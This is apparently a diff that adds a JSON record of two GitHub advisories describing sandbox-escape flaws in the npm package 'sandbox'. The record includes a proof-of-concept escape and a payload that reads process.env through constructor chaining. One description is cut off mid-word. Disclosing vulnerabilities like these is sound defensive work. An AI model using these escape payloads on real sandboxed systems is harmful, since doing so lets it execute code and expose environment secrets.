@@ -1,0 +1,50 @@
+{
+  "packageName": "sandbox",
+  "lastUpdated": "2026-03-08T16:40:25.784Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-fm4j-4xhm-xpwx",
+      "packageName": "sandbox",
+      "title": "Sandbox Breakout / Arbitrary Code Execution in sandbox",
+      "description": "All versions of `sandbox` through 0.8.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.\n\n## Proof of concept\n```\nvar Sandbox = require(\"sandbox\")\ns = new Sandbox()\ncode = `new Function(\"return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())\")()(\"util\").inspect(\"hi\")`\ns.run(code)\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider u",
+      "severity": "medium",
+      "url": "https://github.com/advisories/GHSA-fm4j-4xhm-xpwx",
+      "publishedAt": "2020-09-02T15:51:34Z",
+      "modifiedAt": "2026-02-02T23:13:22Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-fm4j-4xhm-xpwx"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": ">= 0.0.0, < 1.0.0"
+        }
+      ],
+      "source": "github"
+    },
+    {
+      "id": "GHSA-gc25-3vc5-2jf9",
+      "packageName": "sandbox",
+      "title": "Sandbox Breakout / Arbitrary Code Execution in sandbox",
+      "description": "All versions of `sandbox` are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to restrict access to the main context through `this.constructor.constructor` . This may allow attackers to execute arbitrary code in the system. Evaluating the payload `this.constructor.constructor('return process.env')()` prints the contents of `process.env`.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-gc25-3vc5-2jf9",
+      "publishedAt": "2020-09-04T15:00:58Z",
+      "modifiedAt": "2026-02-02T23:12:41Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-gc25-3vc5-2jf9"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": ">= 0.0.0, < 1.0.0"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
